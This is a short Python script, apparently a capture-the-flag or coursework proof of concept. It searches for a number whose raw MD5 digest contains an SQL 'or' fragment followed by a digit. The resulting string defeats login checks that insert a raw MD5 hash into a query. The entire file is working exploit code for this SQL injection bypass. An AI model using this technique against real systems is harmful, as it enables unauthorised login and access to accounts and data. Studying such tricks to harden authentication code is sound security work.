import hashlib, random, string, re


def containsOr(input):
	pos1 = input.find("'||'")
	if pos1 >= 0: # valid
		return input[pos1 + 4].isdigit()
	else:
		pos2 = input.lower().find("'or'")
		if pos2 >= 0: # valid
			return input[pos2 + 4].isdigit()
	return False

# this takes forever so I started at a number closer to
# the target as proof of concept for the submission
i = 129581926211651571912466741651878000000
while True:
	testString = str(i)
	testHash = hashlib.md5(testString).digest()
	i += 1
	if(containsOr(testHash)):
		break

	if i % 100000 == 0:
		print(i)

print testString
